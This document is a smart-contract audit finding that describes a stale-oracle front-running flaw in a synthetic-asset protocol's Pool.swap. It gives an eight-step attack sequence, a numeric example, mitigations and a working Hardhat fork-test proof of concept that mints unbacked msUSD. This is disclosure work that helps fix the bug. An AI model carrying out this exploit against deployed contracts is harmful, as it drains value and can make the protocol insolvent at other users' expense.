### Title

Stale oracle updates allow borrowers to swap depreciating synth debt into unbacked synth assets - (File: contracts/Pool.sol)

### Summary

`Pool.swap` burns one synthetic token and mints another using the currently stored `MasterOracle` quote. Because the swap is not synchronized with pending oracle updates, an unprivileged borrower can mint a synthetic asset, swap it at the pre-loss price, wait for the public oracle update to reduce that synthetic asset’s debt value, swap back only the amount needed to repay, and retain the difference as newly minted synthetic assets. [1](#0-0) 

### Finding Description

`Pool.swap` first burns `syntheticTokenIn_`, then calls `quoteSwapOut`, and finally mints `syntheticTokenOut_` to the caller. [1](#0-0)  `quoteSwapOut` directly converts `amountIn_` through `masterOracle().quote()` and subtracts only the configured swap fee. [2](#0-1) 

Separately, `DebtToken.issue` permits issuance up to the caller’s current `_issuableInUsd`, calculated from the current oracle prices. [3](#0-2)  The borrower’s debt remains denominated in the originally issued synthetic token, while `debtOf` later converts that balance to USD using the updated synthetic-token price. [4](#0-3) 

An attacker can therefore perform the following sequence using only public calls:

1. Deposit collateral through `DepositToken.deposit`.
2. Call `DebtToken.issue(msETHAmount, attacker)` while the oracle still reports the old higher `msETH` price.
3. Front-run a publicly observable downward `msETH` oracle update and call `Pool.swap(msETH, msUSD, msETHAmount)`.
4. The call burns the newly issued `msETH` and mints `msUSD` using the stale higher valuation.
5. Submit or wait for the oracle update. The attacker’s `msETH` debt-token balance is unchanged, but its USD value decreases.
6. Call `Pool.swap(msUSD, msETH, requiredMsUSD)` to obtain enough `msETH` to repay the debt.
7. Repay the `msETH` debt and withdraw the collateral through `DepositToken.withdraw`.
8. Keep the excess `msUSD`.

For example, with a 75% collateral factor, zero issuance/swap fees, $10,000 of collateral, and an `msETH` price decline from $1 to $0.50:

- Attacker issues 7,500 `msETH`, representing $7,500 of debt.
- Before the update, `Pool.swap` mints 7,500 `msUSD`.
- After the update, the same 7,500-`msETH` debt is worth $3,750.
- Attacker swaps 3,750 `msUSD` for 7,500 `msETH`, repays the debt, withdraws the collateral, and retains 3,750 `msUSD`.

The remaining `msUSD` was minted without creating corresponding `msUSD` debt. `DebtToken.issue` mints synthetic assets together with debt [5](#0-4) , whereas `Pool.swap` mints the output asset while leaving the original debt denominated in `syntheticTokenIn_`. [6](#0-5) 

### Impact Explanation

This breaks the expected relationship between outstanding synthetic assets and outstanding debt. A stale oracle quote allows the protocol to mint more output value than the post-update USD value of the burned asset and the associated debt.

The attacker exits with all collateral plus a residual synthetic-asset balance. That residual balance is transferable and can later be swapped into another synthetic asset, used in liquidations, bridged, or sold to other users. Repeated execution can create substantial synthetic liabilities not matched by debt, producing protocol insolvency or losses for other synthetic-asset holders.

The withdrawal path is also reachable: once the debt is repaid, `unlockedBalanceOf` returns the caller’s full deposit-token balance when `_debtInUsd == 0`. [7](#0-6)  `withdraw` then burns the deposit tokens and pulls the underlying collateral from `Treasury`. [8](#0-7) 

### Likelihood Explanation

The attack requires only an EOA and does not require governance, keeper, oracle-operator, relayer, or contract privileges. The attacker needs:

- Collateral sufficient to issue the synthetic asset.
- A pending oracle update that materially decreases the issued synthetic asset’s price.
- The old oracle value to remain accepted long enough for `Pool.swap` to execute before the update.
- Profit greater than issuance, swap, oracle-update, and transaction costs.

Public pull-oracle updates and mempool-visible push-oracle transactions create this ordering opportunity. The stale-price acceptance window may limit how frequently the attack is possible, but neither `DebtToken.issue` nor `Pool.swap` contains a pending-update commitment, round identifier, exchange-rate timestamp check, or post-swap debt synchronization that prevents the transaction ordering. [9](#0-8) [6](#0-5) 

### Recommendation

Do not allow oracle-priced state transitions to use a quote older than a newly available oracle update. Possible mitigations include:

- Make pull-oracle price refresh an explicit prerequisite inside `issue`, `withdraw`, and `swap` paths rather than relying on callers or keepers.
- Record the oracle price timestamp/round used for issuance and require repayment, liquidation, and swap accounting to account for a newer already-published round.
- Add oracle deviation or confidence checks to `Pool.swap`, and temporarily reject swaps when a configured deviation threshold is crossed.
- Introduce a short settlement delay or two-step swap where execution uses the first oracle state published after the request.
- At minimum, tightly bound oracle freshness for `swap` and `issue` and monitor public oracle update transactions for front-running.

### Proof of Concept

The following Hardhat fork test demonstrates the accounting path. It must be run at a fork point where the stored production price for `msETH` is still accepted and a lower signed Pyth update is available. The signed update is fetched before submitting the front-running swap and is posted only afterward.

```ts
import {ethers} from 'hardhat'
import {expect} from 'chai'
import {loadFixture} from '@nomicfoundation/hardhat-network-helpers'
import axios from 'axios'

const PYTH = '0x4305fb66699c3b2702d4d05cf36551390a4c69c6'
const MSETH_FEED_ID =
  '0xff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace'

// Replace with a historical fork timestamp immediately before a materially
// lower ETH/USD Pyth update became available.
const PUBLISH_TIME = 1_700_000_000

async function fixture() {
  const [attacker] = await ethers.getSigners()

  const poolRegistry = await ethers.getContractAt(
    'PoolRegistry',
    '<deployed PoolRegistry>'
  )
  const [poolAddress] = await poolRegistry.getPools()
  const pool = await ethers.getContractAt('contracts/Pool.sol:Pool', poolAddress)

  const msdWETH = await ethers.getContractAt('DepositToken', '<deployed msdWETH>')
  const weth = await ethers.getContractAt('IWETH', '<WETH>')
  const msETH = await ethers.getContractAt('SyntheticToken', '<deployed msETH>')
  const msUSD = await ethers.getContractAt('SyntheticToken', '<deployed msUSD>')
  const msETHDebt = await ethers.getContractAt('DebtToken', '<deployed msETH debt token>')
  const oracle = await ethers.getContractAt(
    ['function quote(address,address,uint256) view returns(uint256)',
     'function quoteTokenToUsd(address,uint256) view returns(uint256)'],
    await pool.masterOracle()
  )
  const pyth = await ethers.getContractAt(
    ['function getUpdateFee(bytes[]) view returns(uint256)',
     'function updatePriceFeeds(bytes[]) payable'],
    PYTH,
    attacker
  )

  // Fetch the already-signed lower-price update that will be posted after
  // the attacker's stale-price swap.
  const response = await axios.get(
    `https://hermes.pyth.network/v2/updates/price/${PUBLISH_TIME}`,
    {params: {'ids[]': [MSETH_FEED_ID], parsed: true, encoding: 'hex'}}
  )
  const updateData = response.data.binary.data.map(
    (x: string) => `0x${x}`
  )

  return {
    attacker,
    pool,
    msdWETH,
    weth,
    msETH,
    msUSD,
    msETHDebt,
    oracle,
    pyth,
    updateData,
  }
}

it('front-runs a synthetic-asset loss update through Pool.swap', async () => {
  const {
    attacker,
    pool,
    msdWETH,
    weth,
    msETH,
    msUSD,
    msETHDebt,
    oracle,
    pyth,
    updateData,
  } = await loadFixture(fixture)

  const collateral = ethers.utils.parseEther('10')

  // Give the attacker production collateral and deposit it.
  await ethers.provider.send('hardhat_setBalance', [
    attacker.address,
    ethers.utils.parseEther('100').toHexString(),
  ])
  await weth.deposit({value: collateral})
  await weth.approve(msdWETH.address, collateral)
  await msdWETH.deposit(collateral, attacker.address)

  const oldMsEthPrice = await oracle.quoteTokenToUsd(
    msETH.address,
    ethers.utils.parseEther('1')
  )

  // Issue near the stale oracle's borrowing limit.
  const issueAmount = ethers.utils.parseEther('7.5')
  await msETHDebt.issue(issueAmount, attacker.address)
  const debt = await msETHDebt.balanceOf(attacker.address)

  // Front-run the pending oracle update.
  await pool.connect(attacker).swap(msETH.address, msUSD.address, issueAmount)

  const msUsdAfterStaleSwap = await msUSD.balanceOf(attacker.address)
  const expectedStaleUsdValue = issueAmount
    .mul(oldMsEthPrice)
    .div(ethers.utils.parseEther('1'))
  expect(msUsdAfterStaleSwap).to.be.closeTo(
    expectedStaleUsdValue,
    expectedStaleUsdValue.div(1000)
  )

  // Post the lower production oracle update.
  const fee = await pyth.getUpdateFee(updateData)
  await pyth.updatePriceFeeds(updateData, {value: fee})

  const newDebtUsd = await oracle.quoteTokenToUsd(msETH.address, debt)
  expect(newDebtUsd).to.be.lt(
    oldMsEthPrice.mul(debt).div(ethers.utils.parseEther('1'))
  )

  // Swap only the post-update USD value needed to recover the full debt amount.
  const requiredMsUsd = await pool.quoteSwapIn(
    msUSD.address,
    msETH.address,
    debt
  )
  await pool
    .connect(attacker)
    .swap(msUSD.address, msETH.address, requiredMsUsd._amountIn)

  // Repay the full original debt and withdraw the collateral.
  await msETHDebt.connect(attacker).repay(attacker.address, debt)
  expect(await msETHDebt.balanceOf(attacker.address)).to.eq(0)

  const msdBalance = await msdWETH.balanceOf(attacker.address)
  await msdWETH.connect(attacker).withdraw(msdBalance, attacker.address)

  // The residual msUSD is the profit left after fully repaying the debt and
  // recovering all collateral.
  expect(await msUSD.balanceOf(attacker.address)).to.be.gt(0)
})
```

The core assertion is that `msUsdAfterStaleSwap` is priced using the pre-update `msETH` value, while the amount required to recover the full `msETH` debt is priced after the lower oracle update. The attacker exits with collateral restored and a positive residual `msUSD` balance.

### Citations

**File:** contracts/Pool.sol (L227-235)
```text
    function debtOf(address account_) public view override returns (uint256 _debtInUsd) {
        IMasterOracle _masterOracle = masterOracle();
        uint256 _length = debtTokensOfAccount.length(account_);
        for (uint256 i; i < _length; ++i) {
            IDebtToken _debtToken = IDebtToken(debtTokensOfAccount.at(account_, i));
            _debtInUsd += _masterOracle.quoteTokenToUsd(
                address(_debtToken.syntheticToken()),
                _debtToken.balanceOf(account_)
            );
```

**File:** contracts/Pool.sol (L513-524)
```text
        _amountOut = _poolRegistry.masterOracle().quote(
            address(syntheticTokenIn_),
            address(syntheticTokenOut_),
            amountIn_
        );

        uint256 _swapFee = feeProvider.swapFees(address(syntheticTokenIn_), address(syntheticTokenOut_));

        if (_swapFee > 0) {
            _fee = _amountOut.wadMul(_swapFee);
            _amountOut -= _fee;
        }
```

**File:** contracts/Pool.sol (L642-653)
```text
    function swap(
        ISyntheticToken syntheticTokenIn_,
        ISyntheticToken syntheticTokenOut_,
        uint256 amountIn_
    )
        external
        override
        whenNotShutdown
        nonReentrant
        onlyIfSyntheticTokenExists(syntheticTokenIn_)
        onlyIfSyntheticTokenExists(syntheticTokenOut_)
        returns (uint256 _amountOut, uint256 _fee)
```

**File:** contracts/Pool.sol (L657-668)
```text
        if (!isSwapActive) revert SwapFeatureIsInactive();
        if (amountIn_ == 0 || amountIn_ > syntheticTokenIn_.balanceOf(_msgSender)) revert AmountInIsInvalid();

        syntheticTokenIn_.burn(_msgSender, amountIn_);

        (_amountOut, _fee) = quoteSwapOut(syntheticTokenIn_, syntheticTokenOut_, amountIn_);

        if (_fee > 0) {
            syntheticTokenOut_.mint(_poolRegistry.feeCollector(), _fee);
        }

        syntheticTokenOut_.mint(_msgSender, _amountOut);
```

**File:** contracts/DebtToken.sol (L254-260)
```text
        (, , , , uint256 _issuableInUsd) = _pool.debtPositionOf(_msgSender);

        IMasterOracle _masterOracle = _pool.masterOracle();

        if (amount_ > _masterOracle.quoteUsdToToken(address(_syntheticToken), _issuableInUsd)) {
            revert NotEnoughCollateral();
        }
```

**File:** contracts/DebtToken.sol (L262-268)
```text
        _mint(_pool, _masterOracle, _msgSender, amount_);

        (_issued, _fee) = quoteIssueOut(amount_);
        if (_fee > 0) {
            _syntheticToken.mint(_pool.feeCollector(), _fee);
        }
        _syntheticToken.mint(to_, _issued);
```

**File:** contracts/DepositToken.sol (L386-390)
```text
        (, , uint256 _debtInUsd, , uint256 _issuableInUsd) = _pool.debtPositionOf(account_);

        if (_debtInUsd == 0) {
            return balanceOf[account_];
        }
```

**File:** contracts/DepositToken.sol (L545-551)
```text
        (_withdrawn, _fee) = quoteWithdrawOut(amount_);
        if (_fee > 0) {
            _transfer(account_, _pool.feeCollector(), _fee);
        }

        _burn(account_, _withdrawn);
        _pool.treasury().pull(to_, _withdrawn);
```
